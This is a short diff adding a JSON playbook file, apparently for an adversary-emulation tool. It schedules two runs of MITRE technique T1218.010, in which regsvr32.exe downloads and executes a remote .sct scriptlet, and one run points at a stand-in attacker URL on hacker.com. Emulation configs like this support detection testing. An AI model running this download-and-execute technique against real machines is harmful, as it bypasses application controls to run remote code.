@@ -1,0 +1,27 @@
+{
+    "type": "local",
+    "sleep": 1,
+    "playbooks": [
+        {
+            "name": "regsvr32.exe download and execute .sct file - Default",
+            "enabled": true,
+            "playbook_sleep": 0,
+            "tasks": [
+                {
+                    "technique_id": "T1218.010"
+                }
+            ]
+        },
+        {
+            "name": "regsvr32.exe download and execute .sct file - Defined",
+            "enabled": true,
+            "playbook_sleep": 0,
+            "tasks": [
+                {
+                    "technique_id": "T1218.010",
+                    "url": "http://123.hacker.com/T1218.010.sct"
+                }
+            ]
+        }
+    ]
+}
